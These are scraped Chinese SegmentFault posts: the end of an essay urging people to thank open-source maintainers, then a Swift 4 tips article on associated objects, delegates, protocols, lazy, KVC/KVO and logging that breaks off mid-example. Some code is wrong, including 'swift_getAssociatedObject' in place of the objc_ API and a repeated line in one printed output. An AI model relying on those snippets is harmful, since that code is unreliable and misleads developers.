<li>我们转而看向了遇到的下一个问题。</li>
</ol>
<p>开源项目就像水和空气一样，人们只是享受它带来的好处并且习以为常。我们不会对空气或水说感谢，因为我们不知道那是谁造的。但是我们知道是谁创建了这些非常棒的开源项目。但是我们知道这么棒的开源项目是谁维护的啊。</p>
<h4>项目维护者们并不在意这些</h4>
<blockquote>开源项目使用者可能会想：<p>“他们不需要这些，他们需要的是 pull request 和能够修复 bug 等实质性工作。”</p>
<p>“我想他们更喜欢收到捐款。”</p>
</blockquote>
<p>但是他们真的很在意，<a href=""https://news.ycombinator.com/item?id=15623604"" rel=""nofollow noreferrer"">有时候，开源项目维护者真的需要你对他说一声谢谢</a>。当然，如果你能为项目捐款再好不过了，但是我知道的大多数开源项目维护者目的并不是赚钱。他们最终可能赚了钱，但与开发项目的动机相比，顶多算是一个副产品。我注意到，开源项目常常比非开源项目要好。因为最出色的开发者是出于激情和利他主义来开发产品的。如果你没能力或者不想捐钱，你可以给他们写句感谢的话。</p>
<h4>我们真的太“忙”了</h4>
<blockquote>“我们正在用双手改变世界。”<p>“我的项目必须在一周内启动。”</p>
<p>“我们每天都有数百封邮件需要回复。”</p>
<p>“我们只是没有时间。”</p>
</blockquote>
<p>这些开源项目有更大的潜力去改变世界；或许其中的哪个项目已经改变了世界。</p>
<blockquote>Github 在 Rails 上使用 Ruby<br>Instagram 使用 django<br>我们很多服务器都在运行着 Linux</blockquote>
<p>可能没有这些开源项目就没有我们现在的这些项目。</p>
<p>十分钟，你可能做不了什么大事。现在社交媒体让我们养成了一种习惯，就是更愿意点击一个 upvote 或者类似的按钮，而不是花十分钟来写一封感谢信。尽管一个好的开源项目可能节省了不仅仅十分钟的时间。我在 ProductHunt 上公开 <a href=""https://www.thankyouopensource.com"" rel=""nofollow noreferrer"">www.thankyouopensource.com</a> 这个网站后，很多用户抱怨最低 300 个字符的限制条件。我设置这个条件是想避免像下面这样简单的话：</p>
<blockquote>“谢谢，你们太棒了。”<p>“非常感谢。”</p>
<p>“我很喜欢你的开源项目。”</p>
</blockquote>
<p>我就得这些用户太“忙”了，没空写一封感谢信。但是这对我来说看起来像没有意义的垃圾邮件，我认为读这些就是在浪费时间。我们希望看到的感谢信是处于自愿的而不是义务的。这之间的不同对我们来说显而易见。我们希望维护者们知道我们为什么感谢他们的付出，他们的项目怎么帮助了我们，我们这些发自内心的感谢也是维护者们继续付出的强大动力之一。最重要的是，我们欢迎所有对维护项目感兴趣的人的加入，因为这确实是一件很棒的工作。一旦你成为了维护者，你会在感谢心中看到很多人对你付出的真诚的感谢。我建议在 GitHub 上加一个 <strong>感谢</strong> 的标签，不仅仅是感谢和激励维护者，更是邀请更多的人加入到其中。</p>
<h4>最后的一点想法</h4>
<p>开源项目维护者是我们交朋友的好选择，也是公司雇佣员工时的明智之选。他们有激情，愿意分享，能够坚持。他们是真正的 MVP，他们应该得到真诚的感谢。</p>
<h4>什么是 <a href=""https://www.thankyouopensource.com"" rel=""nofollow noreferrer"">Thank you, open source</a> ?</h4>
<p>这是一个非官方的，为大家向开源项目作者和维护者表达感谢的平台。同时它还为项目维护者们宣传其他项目提供了一个平台 ?</p>
<hr>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012575348?w=227&amp;h=227"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><strong>欢迎关注 LeviDing 的微信公众号</strong></p>

                ", 为什么我们从来不去感谢开源项目维护者,1531971909,437,1,795,1,1,https://segmentfault.com/a/1190000012575030
37,1,0,6,"
                    
<p>以下内容均是笔者学习过程中<strong>收集</strong>的知识点，顺序比较跳跃，初衷是为了方便查阅，顺便加深记忆。<strong>内容会不断更新</strong>，如果有什么问题或者有好的 Swift 方面的语法糖或者知识点也可以提出来，我会挑选斟酌后收录，欢迎大家关注～</p>
<p><strong>环境：</strong></p>
<blockquote>Swift 4.0 <br>Xcode 9.1</blockquote>
<h2>Associated Object</h2>
<p>Objective-C 的 runtime 里的 Associated Object 允许我们在使用 Category 扩展现有的类的功能的时候，直接添加实例变量。在 Swift 中 extension 不能添加<strong>存储属性</strong>，我们可以利用 Associated Object 来实现，比如下面的 <code>title</code> 「实际上」是一个存储属性：</p>
<pre><code class=""swift"">// MyClass.swift
class MyClass {}

// MyClassExtension.swift
private var key: Void?

extension MyClass {
    var title: String? {
        get {
            return swift_getAssociatedObject(self, &amp;key) as? String
        }

        set {
            swift_setAssociatedObject(self,
                &amp;key, newValue,
                .swift_ASSOCIATION_RETAIN_NONATOMIC)
        }
    }
}</code></pre>
<pre><code class=""swift"">// 测试
func printTitle(_ input: MyClass) {
    if let title = input.title {
        print(""Title: \(title)"")
    } else {
        print(""没有设置"")
    }
}

let a = MyClass()
printTitle(a)
a.title = ""Swifter.tips""
printTitle(a)

// 输出：
// 没有设置
// Title: Swifter.tips”</code></pre>
<h2>Delegate 声明为 weak</h2>
<p>Swift 中 Delegate 需要被声明成 <code>weak</code>，来避免访问到已被回收的内存而导致崩溃，如果我们像下面这样，是编译不过的：</p>
<pre><code class=""swift"">protocol MyClassDelegate {
    func method()
}

class MyClass {
    weak var delegate: MyClassDelegate?
}

class ViewController: UIViewController, MyClassDelegate {
    // ...
    var someInstance: MyClass!

    override func viewDidLoad() {
        super.viewDidLoad()

        someInstance = MyClass()
        someInstance.delegate = self
    }

    func method() {
        print(""Do something"")
    }

    //...
}

// 编译失败
// 'weak' may only be applied to class and class-bound protocol types, not 'MyClassDelegate'</code></pre>
<p>这是因为 Swift 的 protocol 是可以被除了 class 以外的其他类型遵守的，而对于像 <code>struct</code> 或是 <code>enum</code> 这样的类型，本身就不通过引用计数来管理内存，所以也不可能用 <code>weak</code> 这样的 ARC 的概念来进行修饰。</p>
<p>想要在 Swift 中使用 weak delegate，我们就需要将 protocol 限制在 class 内：</p>
<ul><li>一种做法是将 protocol 声明为 Objective-C 的，这可以通过在 protocol 前面加上 <code>@objc</code> 关键字来达到，Objective-C 的 protocol 都只有类能实现，因此使用 weak 来修饰就合理了：</li></ul>
<pre><code class=""swift"">@objc protocol MyClassDelegate {
    func method()
}</code></pre>
<ul><li>另一种<strong>可能更好</strong>的办法是在 protocol 声明的名字后面加上 <code>class</code>，这可以为编译器显式地指明这个 protocol 只能由 <code>class</code> 来实现，避免了过多的不必要的 Objective-C 兼容：</li></ul>
<pre><code class=""swift"">protocol MyClassDelegate: class {
    func method()
}</code></pre>
<h2>可选协议和协议扩展</h2>
<p>Objective-C 中的 protocol 里存在 <code>@optional</code> 关键字，被这个关键字修饰的方法并非必须要被实现，原生的 Swift protocol 里没有可选项，所有定义的方法都是必须实现的，如果不是实现是无法编译的：</p>
<pre><code class=""swift"">class ViewController: UIViewController,MyProtocol { }

// 编译失败
// Type 'ViewController' does not conform to protocol 'MyProtocol'</code></pre>
<p>如果我们想要像 Objective-C 里那样定义可选的协议方法，就需要将协议本身和可选方法都定义为 Objective-C 的，也即在 protocol 定义之前加上 <code>@objc</code>，方法之前加上 <code>@objc optional</code>：</p>
<pre><code class=""swift"">@objc protocol MyProtocol {
    @objc optional func myMethod()
}</code></pre>
<p>另外，对于所有的声明，它们的前缀修饰是完全分开的，<strong>也就是说你不能像是在 Objective-C 里那样用一个 <code>@optional</code> 指定接下来的若干个方法都是可选的了，</strong>必须对每一个可选方法添加前缀，对于没有前缀的方法来说，它们是默认必须实现的：</p>
<pre><code class=""swift"">@objc protocol MyProtocol {
    @objc optional func optionalMethod()        // 可选
    func necessaryMethod()                      // 必须
    @objc optional func anotherOptionalMethod() // 可选
}</code></pre>
<p><strong>一个不可避免的限制是</strong>，使用 <code>@objc</code> 修饰的 protocol 就只能被 <code>class</code> 实现了，也就是说，对于 <code>struct</code> 和 <code>enum</code> 类型，我们是无法令它们所实现的协议中含有可选方法或者属性的。另外，实现它的 <code>class</code> 中的方法还必须也被标注为 <code>@objc</code>，或者整个类就是继承自 <code>NSObject</code>。对于这种问题，在 Swift 2.0 中，我们有了另一种选择，那就是使用 <strong>protocol extension</strong>。我们可以在声明一个 protocol 之后再用 extension 的方式给出部分方法<strong>默认的实现</strong>，这样这些方法在实际的类中就是可选实现的了：</p>
<pre><code class=""swift"">protocol MyProtocol {
    func optionalMethod()        // 可选
    func necessaryMethod()       // 必须
    func anotherOptionalMethod() // 可选
}

extension MyProtocol {
    
    //默认的可选实现
    func optionalMethod() {
        print(""optionalMethod"")
    }
    
    //默认的可选实现
    func anotherOptionalMethod() {
        print(""anotherOptionalMethod"")
    }   
}</code></pre>
<pre><code class=""swift"">class ViewController: UIViewController,MyProtocol {
    
    // 必须的实现
    func necessaryMethod() {
        print(""necessaryMethod"")
    }
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        self.optionalMethod();
        self.necessaryMethod();
        self.anotherOptionalMethod();
    }
}

// 输出：
// optionalMethod
// necessaryMethod
// necessaryMethod</code></pre>
<h2>单例</h2>
<p>Swift 中的单例非常简单，Swift 1.2 以及之后：</p>
<pre><code class=""swift"">class Singleton  {
    static let sharedInstance = Singleton()
    private init() {}
}</code></pre>
<p>这种写法不但是线程安全的，也是懒加载的，<code>let</code> 定义的属性本身就是线程安全的，同时 <code>static</code> 定义的是一个 class constant，拥有全局作用域和懒加载特性。</p>
<p>另外，这个类型中加入了一个私有的初始化方法，来覆盖默认的公开初始化方法，这让项目中的其他地方不能够通过 init 来生成自己的 <code>Singleton </code> 实例，也保证了类型单例的唯一性。如果你需要的是类似 default 的形式的单例 (也就是说这个类的使用者可以创建自己的实例) 的话，可以去掉这个私有的 <code>init</code> 方法。</p>
<h2>输出格式化</h2>
<p>在 Objective-C 中的 <code>%@</code> 这样的格式在指定的位置设定占位符，然后通过参数的方式将实际要输出的内容补充完整。例如 Objective-C 中常用的向控制台输出的 <code>NSLog</code> 方法就使用了这种格式化方法：</p>
<pre><code class=""swift"">float a = 1.234567;
NSString *b = @""Helllo"";
NSLog(@""float：%.2f  str：%p"",a,b);

// 输出：
// float：1.23  str：0x1024a1078</code></pre>
<p>对应 Swift 中我们可以这样：</p>
<pre><code class=""swift"">let a = 1.234567
let b = ""Helllo""
let c = String(format:""float：%.2f str：%p"",a,b)
print(c)

// 输出：
// float：1.23 str：0x604000249e10</code></pre>
<h2>Selector</h2>
<p><code>@selector</code> 是 Objective-C 时代的一个关键字，它可以将一个方法转换并赋值给一个 SEL 类型，它的表现很类似一个动态的函数指针。在 Swift 中没有 <code>@selector</code> 了，取而代之，从 Swift 2.2 开始我们使用 <code>#selector</code> 来从暴露给 Objective-C 的代码中获取一个 <code>selector</code>，并且因为 <code>selector</code> 是 Objective-C runtime 的概念，在 Swift 4 中，默认情况下所有的 Swift 方法在 Objective-C 中都是不可见的，所以你需要在这类方法前面加上 <code>@objc</code> 关键字，将这个方法暴露给 Objective-C，才能进行使用：</p>
<pre><code class=""swift"">let btn = UIButton.init(type: .system)
btn.backgroundColor = UIColor.red
btn.frame = CGRect(x: 100, y: 100, width: 150, height: 40)
btn.setTitle(""Button"", for: .normal)
//无参数
btn.addTarget(self, action: #selector(btnClick), for: .touchUpInside)
view.addSubview(btn)

@objc func btnClick()  {
    print(""button click !"")
}</code></pre>
<pre><code class=""swift"">...
//有参数
btn.addTarget(self, action: #selector(btnClick(_ :)), for: .touchUpInside)
...

@objc func btnClick(_ button: UIButton)  {
    print(""button click !"")
}</code></pre>
<h2>将 protocol 的方法声明为 mutating</h2>
<p>Swift 的 protocol 不仅可以被 class 类型实现，也适用于 <code>struct</code> 和 <code>enum</code>，因为这个原因，我们在写给别人用的协议时需要多考虑是否使用 <code>mutating</code> 来修饰方法。Swift 的 <code>mutating</code> 关键字修饰方法是为了能在该方法中修改 <code>struct</code> 或是 <code>enum</code> 的变量，所以如果你没在协议方法里写 <code>mutating</code> 的话，别人如果用 <code>struct</code> 或者 <code>enum</code> 来实现这个协议的话，就不能在方法里改变自己的变量了，比如下面的代码是编译不过的：</p>
<pre><code class=""swift"">protocol Vehicle {
    
    func changeColor()
    
}

struct MyCar: Vehicle {
    
    var color = ""blue""
    
    func changeColor() {
        color = ""red""
    }
}

// 编译失败
// Cannot assign to property: 'self' is immutable</code></pre>
<p>我们应该加上 <code>mutating</code> 关键字：</p>
<pre><code class=""swift"">
protocol Vehicle {
    
    mutating func changeColor()
    
}

struct MyCar: Vehicle {
    
    var color = ""blue""
    
    mutating func changeColor() {
        color = ""red""
    }
}

override func viewDidLoad() {
    super.viewDidLoad()

    var car = MyCar()
    print(car.color)
    car.changeColor()
    print(car.color)    
}

// 输出：
// blue
// 输出：
// red</code></pre>
<h2>数组遍历 enumerate</h2>
<p>使用 NSArray 时一个很常遇见的的需求是在枚举数组内元素的同时也想使用对应的<strong>下标索引</strong>，在 Objective-C 中最方便的方式是使用 NSArray 的 <code>enumerateObjectsUsingBlock:</code> ，在 Swift 中存在一个效率，安全性和可读性都很好的替代，那就是快速枚举某个数组的<code>EnumerateGenerator</code>，它的元素是同时包含了元素下标索引以及元素本身的多元组：</p>
<pre><code class=""swift"">let arr = [""a"",""b"",""c"",""d"",""e""]
for (idx, str) in arr.enumerated() {
    print(""idx: \(idx) str: \(str)"")
}

// 输出：
idx: 0 str: a
idx: 1 str: b
idx: 2 str: c
idx: 3 str: d
idx: 4 str: e</code></pre>
<h2>输入输出参数 inout</h2>
<p>函数参数默认是<strong>常量</strong>，如果试图在函数体中更改参数值将会导致<strong>编译错误</strong>，比如下面的例子中尝试着交换值：</p>
<pre><code class=""swift"">func swapTwoInts(_ a: Int, _ b: Int) {
    let temporaryA = a
    a = b
    b = temporaryA
}

// 编译失败
// Cannot assign to value: 'a' is a 'let' constant
// Cannot assign to value: 'b' is a 'let' constant</code></pre>
<p>如果想要一个函数可以修改参数的值，并且想要在这些修改在函数调用结束后仍然存在，那么就应该把这个参数定义为输入输出参数（In-Out Parameters）：</p>
<pre><code class=""swift"">func swapTwoInts(_ a: inout Int, _ b: inout Int) {
    let temporaryA = a
    a = b
    b = temporaryA
}</code></pre>
<h2>Default 参数</h2>
<p>Swift 的方法是支持默认参数的，也就是说在声明方法时，可以给某个参数指定一个默认使用的值。在调用该方法时要是传入了这个参数，则使用传入的值，如果缺少这个输入参数，那么直接使用设定的默认值进行调用。和其他很多语言的默认参数相比较，Swift 中的默认参数限制更少，并没有所谓 <strong>""默认参数之后不能再出现无默认值的参数""</strong>这样的规则，举个例子，下面两种方法的声明在 Swift 里都是合法可用的：</p>
<pre><code class=""swift"">func sayHello1(str1: String = ""Hello"", str2: String, str3: String) {
    print(str1 + str2 + str3)
}

func sayHello2(str1: String, str2: String, str3: String = ""World"") {
    print(str1 + str2 + str3)
}</code></pre>
<pre><code class=""swift"">sayHello1(str2: "" "", str3: ""World"")
sayHello2(str1: ""Hello"", str2: "" "")

//输出都是 Hello World</code></pre>
<h2>延迟加载 lazy</h2>
<p>延时加载或者说延时初始化是很常用的优化方法，在构建和生成新的对象的时候，内存分配会在运行时耗费不少时间，<strong>如果有一些对象的属性和内容非常复杂的话，这个时间更是不可忽略</strong>。另外，有些情况下我们并不会立即用到一个对象的所有属性，而默认情况下初始化时，<strong>那些在特定环境下不被使用的存储属性，也一样要被初始化和赋值</strong>，也是一种浪费。在 Objective-C 中，一个延迟加载一般是这样的：</p>
<pre><code class=""objc"">// ClassA.h
@property (nonatomic, copy) NSString *testString;

// ClassA.m
- (NSString *)testString {
     if (!_testString) {
         _testString = @""Hello"";
        NSLog(@""只在首次访问输出"");
     }
     return _testString;
}</code></pre>
<p>对应在 Swift 中，使用 <code>lazy</code> 作为属性修饰符时，只能声明属性是<strong>变量</strong>，且我们需要显式地指定<strong>属性类型</strong>，否则会编译错误：</p>
<pre><code class=""swift"">class ClassA {
    lazy let str: String = {
        let str = ""Hello""
        print(""只在首次访问输出"")
        return str
    }()
}

// 编译失败
// 'lazy' cannot be used on a let

class ClassA {
    lazy var str = {
        let str = ""Hello""
        print(""只在首次访问输出"")
        return str
    }()
}

// 编译失败
// Unable to infer complex closure return type</code></pre>
<p>我们应该声明为 <code>var</code> 并指定好类型：</p>
<pre><code class=""swift"">class ClassA {
    lazy var str: String = {
        let str = ""Hello""
        print(""只在首次访问输出"")
        return str
    }()
}

override func viewDidLoad() {
    super.viewDidLoad()

    let ca = ClassA()
    print(ca.str)
    print(ca.str)
    print(ca.str)   
}

// 输出：
// 只在首次访问输出
// Hello
// Hello
// Hello</code></pre>
<p>如果不需要做什么额外工作的话，也可以对这个 <code>lazy</code> 的属性直接写赋值语句：</p>
<pre><code class=""swift"">lazy var str: String = ""Hello""</code></pre>
<p>我们还可以利用 <code>lazy</code> 配合像 <code>map</code> 或是 <code>filter</code> 这类接受闭包并进行运行的方法一起，<strong>让整个行为变成延时进行的</strong>。在某些情况下这么做也对性能会有不小的帮助。例如，直接使用 map 时：</p>
<pre><code class=""swift"">let data = 1...3
let result = data.map {
    (i: Int) -&gt; Int in
    print(""正在处理 \(i)"")
    return i * 2
}

print(""准备访问结果"")
for i in result {
    print(""操作后结果为 \(i)"")
}

print(""操作完毕"")

// 输出：
// 正在处理 1
// 正在处理 2
// 正在处理 3
// 准备访问结果
// 操作后结果为 2
// 操作后结果为 4
// 操作后结果为 6
// 操作完毕</code></pre>
<p>而如果我们先进行一次 <code>lazy</code> 操作的话，我们就能得到延时运行版本的容器：</p>
<pre><code class=""swift"">let data = 1...3
let result = data.lazy.map {
    (i: Int) -&gt; Int in
    print(""正在处理 \(i)"")
    return i * 2
}

print(""准备访问结果"")
for i in result {
    print(""操作后结果为 \(i)"")
}

print(""操作完毕"")

// 准备访问结果
// 正在处理 1
// 操作后结果为 2
// 正在处理 2
// 操作后结果为 4
// 正在处理 3
// 操作后结果为 6
// 操作完毕</code></pre>
<p>对于那些不需要完全运行，可能提前退出的情况，使用 lazy 来进行性能优化效果会非常有效。</p>
<h2>编译标记</h2>
<p>在 Objective-C 中，我们经常在代码中插入 <code>#param</code> 符号来标记代码的区间，这样在 Xcode 的导航栏中我们就可以看到组织分块后的方法列表。在 Swift 中我们可以用 <code>MARK:</code> 来代替：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012431993?w=962&amp;h=916"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在 Objective-C 中还有一个很常用的编译标记，那就是 <code>#warning</code>，一个 <code>#warning</code> 标记可以在 Xcode 的代码编辑器中显示为明显的黄色警告条，非常适合用来提示代码的维护者和使用者需要对某些东西加以关注。在 Swift 中我们可以用 <code>FIXME:</code> 和 <code>TODO:</code> 配合 <code>shell</code> 来代替：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012431994?w=2416&amp;h=944"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>脚本：</p>
<pre><code class=""shell"">TAGS=""TODO:|FIXME:""
echo ""searching ${SRCROOT} for ${TAGS}""
find ""${SRCROOT}"" \( -name ""*.swift"" \) -print0 | xargs -0 egrep --with-filename --line-number --only-matching ""($TAGS).*\$"" | perl -p -e ""s/($TAGS)/ warning: \$1/""</code></pre>
<p>效果：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012431995?w=526&amp;h=368"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span><br><span class=""img-wrap""><img data-src=""/img/remote/1460000012431996"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>换行符</h2>
<p>在 Swift 3 中，需要换行时是需要 <code>\n</code>：</p>
<pre><code class=""swift"">let str = ""xxxx\nxxx""

// 输出：
// xxxx
// xxx</code></pre>
<p>在 swift 4 中，我们可以使用 <code>""""""</code>：</p>
<pre><code class=""swift"">let jsonStr = """"""
        {
            ""id"": 123455,
            ""nickname"": ""xxxx"",
            ""isMale"": true,
            ""birthday"": ""2000年3月24日"",
            ""personalURL"": ""https://xxxxxx.github.io""
        }
        """"""
          
// 输出：
{
    ""id"": 123455,
    ""nickname"": ""xxxx"",
    ""isMale"": true,
    ""birthday"": ""2000年3月24日"",
    ""personalURL"": ""https://xxxxxx.github.io""
}</code></pre>
<h2>字符串切割 split</h2>
<p>我们需要切割某个字符串时可以用 <code>split</code> 方法，需要注意的是，返回的结果是个<strong>数组</strong>：</p>
<pre><code class=""swift"">let str = ""Hello，world !""
print(str.split(separator: ""，""))

// 输出：
// [""Hello"", ""world !""]</code></pre>
<h2>KVC</h2>
<pre><code class=""swift"">class MyClass {
    var name = ""ifelseboyxx""
}</code></pre>
<p>Swift 4 中 Apple 引入了新的 KeyPath 的表达方式，现在，对于类型 <code>MyClass</code> 中的<strong>变量</strong> <code>name</code>，对应的 KeyPath 可以写为 <code>\MyClass.name</code>，利用 KVC 修改 <code>name</code> 值的话，我们可以这么操作：</p>
<pre><code class=""swift"">let object = MyClass()
print(""name: \(object.name)"")
// set
object[keyPath: \MyClass.name] = ""ifelseboy""
// get
print(""name: \(object[keyPath: \MyClass.name])"")

// 输出：
// name: ifelseboyxx
// name: ifelseboy</code></pre>
<p>另外 Swift 4 中 <code>struct</code> 同样支持 KVC ：</p>
<pre><code class=""swift"">struct MyStruct {
    var age: Int
}

var obj = MyStruct(age: 18)
print(""我今年 \(obj.age) 岁了"")
obj[keyPath: \MyStruct.age] = 8
print(""我今年 \(obj[keyPath: \MyStruct.age]) 岁了"")

// 输出：
// 我今年 18 岁了
// 我今年 8 岁了</code></pre>
<h2>Swift 中值类型和引用类型注意点</h2>
<p>KVC 一节中代码里有个注意点：</p>
<pre><code class=""swift"">var obj = MyStruct(age: 18)
//替换为
let obj = MyStruct(age: 18)</code></pre>
<p>是编译不过的，会报错：</p>
<pre><code class=""swift"">Cannot assign to immutable expression of type 'Int'</code></pre>
<p>笔者初次也犯了这样的错误，想当然的认为 <code>MyClass</code> 用 <code>let</code> 声明的是没有问题的，<code>struct</code> 也一样：</p>
<pre><code class=""swift"">let object = MyClass()</code></pre>
<p><strong>其实原因很简单，swift 中 Class 是引用类型的，而 struct 是值类型的：值类型在被赋给一个变量，或被传给函数时，实际是做了一次拷贝。引用类型在被赋给一个变量，或被传给函数时，传递的是引用。</strong></p>
<h2>KVO</h2>
<p>很遗憾，依然只有 <code>NSObject</code> 才能支持 KVO，另外由于 Swift 为了效率，默认禁用了动态派发，因此想用 Swift 来实现 KVO，我们还需要做额外的工作，那就是将想要观测的对象标记为 <code>dynamic</code> 和 <code>@objc</code>，下面的 ? 是 <code>ViewController</code> 监听 <code>MyClass</code> 的 <code>date</code> 属性：</p>
<pre><code class=""swift"">class MyClass: NSObject {
    @objc dynamic var date = Date()
}

class ViewController: UIViewController {
    
    var myObject: MyClass!
    var observation: NSKeyValueObservation?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        myObject = MyClass()
        print(""当前日期：\(myObject.date)"")
    
        observation = myObject.observe(\MyClass.date, options: [.old,.new], changeHandler: { (_, change) in
            if let newDate = change.newValue , let oldDate = change.oldValue {
                print(""日期发生变化 old：\(oldDate) new：\(newDate) "")
            }
        })
        
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 1) {
            self.myObject.date = Date()
        }
    }
}

// 输出：
// 当前日期：2017-12-07 06:31:26 +0000
// 日期发生变化 old：2017-12-07 06:31:26 +0000 new：2017-12-07 06:31:27 +0000 </code></pre>
<p>在 Objective-C 中我们几乎可以没有限制地对所有满足 KVC 的属性进行监听，<strong>而现在我们需要属性有 <code>dynamic</code> 和 <code>@objc</code> 进行修饰</strong>。大多数情况下，我们想要观察的类包含这两个修饰 (除非这个类的开发者有意为之，否则一般也不会有人愿意多花功夫在属性前加上它们，因为这毕竟要损失一部分性能)，并且有时候我们很可能也无法修改想要观察的类的源码。遇到这样的情况的话，<strong>一个可能可行的方案是继承这个类并且将需要观察的属性使用 <code>dynamic</code> 和 <code>@objc</code> 进行重写。</strong>比如刚才我们的 <code>MyClass</code> 中如果 <code>date</code> <strong>没有相应标注的话</strong>，我们可能就需要一个新的 <code>MyChildClass </code>了：</p>
<pre><code class=""swift"">class MyClass: NSObject {
    var date = Date()
}

class MyChildClass: MyClass {
    @objc dynamic override var date: Date {
        get { return super.date }
        set { super.date = newValue }
    }
}

class ViewController: UIViewController {
    
    var myObject: MyChildClass!
    var observation: NSKeyValueObservation?
    
    override func viewDidLoad() {
        super.viewDidLoad()
        
        myObject = MyChildClass()
        print(""当前日期：\(myObject.date)"")
    
        observation = myObject.observe(\MyChildClass.date, options: [.old,.new], changeHandler: { (_, change) in
            if let newDate = change.newValue , let oldDate = change.oldValue {
                print(""日期发生变化 old：\(oldDate) new：\(newDate) "")
            }
        })
        
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 1) {
            self.myObject.date = Date()
        }
    }
}

// 输出：
// 当前日期：2017-12-07 06:36:50 +0000
// 日期发生变化 old：2017-12-07 06:36:50 +0000 new：2017-12-07 06:36:51 +0000 </code></pre>
<h2>Swift UIButton 状态的叠加</h2>
<p>在 Objective-C 中，如果我们想叠加按钮的某个状态，可以这么写：</p>
<pre><code class=""objc"">UIButton * button = [UIButton buttonWithType:UIButtonTypeCustom];
[button setTitle:@""Test"" forState:UIControlStateNormal | UIControlStateSelected];</code></pre>
<p>对应的 Swift 我们可以这么写：</p>
<pre><code class=""swift"">let btn = UIButton.init(type: .custom)
btn.setTitle(""hehe"", for: [.normal ,.selected])</code></pre>
<p>把需要叠加的状态用个<strong>数组</strong>装起来就行了。</p>
<h2>Swift 中的 “@synchronized”</h2>
<p>在 Objective-C 中，我们可以用 <code>@synchronized</code> 这个关键字可以用来修饰一个变量，并为其自动加上和解除互斥锁。这样，可以保证变量在作用范围内不会被其他线程改变：</p>
<pre><code class=""objc"">- (void)myMethod:(id)anObj {
    @synchronized(anObj) {
        // 在括号内持有 anObj 锁
    }
}</code></pre>
<p>虽然这个方法很简单好用，但是很不幸的是在 Swift 中它已经 (或者是暂时) 不存在了。其实 <code>@synchronized</code> 在幕后做的事情是调用了 <code>objc_sync</code> 中的 <code>objc_sync_enter</code> 和 <code>objc_sync_exit</code> 方法，并且加入了一些异常判断。因此，在 Swift 中，如果我们忽略掉那些异常的话，我们想要 lock 一个变量的话，可以这样写：</p>
<pre><code class=""swift"">func myMethod(anObj: AnyObject!) {
    objc_sync_enter(anObj)

    // 在 enter 和 exit 之间持有 anObj 锁

    objc_sync_exit(anObj)
}</code></pre>
<p>更进一步，如果我们喜欢以前的那种形式，甚至可以写一个全局的方法，并接受一个闭包，来将 <code>objc_sync_enter</code> 和 <code>objc_sync_exit</code> 封装起来：</p>
<pre><code class=""swift"">func synchronized(_ lock: AnyObject, closure: () -&gt; ()) {
    objc_sync_enter(lock)
    closure()
    objc_sync_exit(lock)
}

// 使用：
synchronized(self) {
            
}</code></pre>
<p>这样使用起来就和 Objective-C 中 <code>@synchronized</code> 很像了。</p>
<p>再举个 ? ，如果我们想为某个类实现一个线程安全的 <code>setter</code>，可以这样：</p>
<pre><code class=""swift"">class Obj {
    var _str = ""123""
    var str: String {
        get {
            return _str
        }
        set {
            synchronized(self) {
                _str = newValue
            }
        }
    }
}</code></pre>
<h2>自定义日志输出</h2>
<p>在 Objective-C 中，我们通常会自定义日志输出来完善信息以及避免 <code>release</code> 下的输出，比如下面这种，可以额外提供行数、方法名等信息：</p>
<pre><code class=""objc"">#ifdef DEBUG
#define XXLog(fmt, ...) NSLog((@""%s [Line %d] "" fmt), __PRETTY_FUNCTION__, __LINE__, ##__VA_ARGS__)
#else
#define XXLog(...)
#endif</code></pre>
<pre><code class=""objc"">- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
    // Override point for customization after application launch.
    
    XXLog(@""ifelseboyxx"");

    return YES;
}

// 输出：
// 2017-12-08 13:32:02.211306+0800 Demo[17902:88775537] -[AppDelegate application:didFinishLaunchingWithOptions:] [Line 28] ifelseboyxx</code></pre>
<p>在 Swift 中，我们可以这样自定义：</p>
<pre><code class=""swift"">func xxprint&lt;T&gt;(_ message: T, filePath: String = #file, line: Int = #line, function: String = #function) {
    #if DEBUG
        let fileName = (filePath as NSString).lastPathComponent.replacingOccurrences(of: "".Swift"", with: """")
        let dateFormatter = DateFormatter()
        dateFormatter.locale = Locale.current
        dateFormatter.dateFormat = ""yyyy-MM-dd HH:mm:ss""
        print(""["" + dateFormatter.string(from: Date()) + "" "" + fileName + "" "" + function + "" \(line)"" + ""]："" + ""\(message)"")
    #endif
}</code></pre>
<pre><code class=""swift"">class ViewController: UIViewController {
    
    override func viewDidLoad() {
        super.viewDidLoad()
    
        xxprint(""ifelseboyxx"")
        DispatchQueue.main.asyncAfter(deadline: DispatchTime.now() + 1) {
            xxprint(""ifelseboyxx"")
        }
    }
}

// 输出：
// [2017-12-08 13:49:38 ViewController.swift viewDidLoad() 27]：ifelseboyxx
// [2017-12-08 13:49:39 ViewController.swift viewDidLoad() 29]：ifelseboyxx</code></pre>
<h2>Swift 中的 “readonly”</h2>
<p>在 Objective-C 中，我们通常把属性声明为 <code>readonly</code> 来提醒别人：“不要修改！！”，通常这么写：</p>
<pre><code class=""objc"">@interface Person : NSObject

@property (nonatomic, readonly, copy) NSString *name;

@end</code></pre>
<p>如果外部尝试修改的话，会编译错误：</p>
<pre><code class=""objc"">- (void)viewDidLoad {
    [super viewDidLoad];
   
    Person *p = [Person new];
    p.name = @""ifelseboyxx"";
    
}

// 编译错误：
// Assignment to readonly property</code></pre>
<p>有些情况下，我们希望内部可以点语法访问 <code>name</code> 属性，也就是 <code>self.name</code>，但是因为是 <code>readonly</code> 的，会编译错误：</p>
<pre><code class=""objc"">@implementation Person

- (instancetype)init {
    self = [super init];
    if (self) {
        self.name = @""ifelseboyxx"";
    }
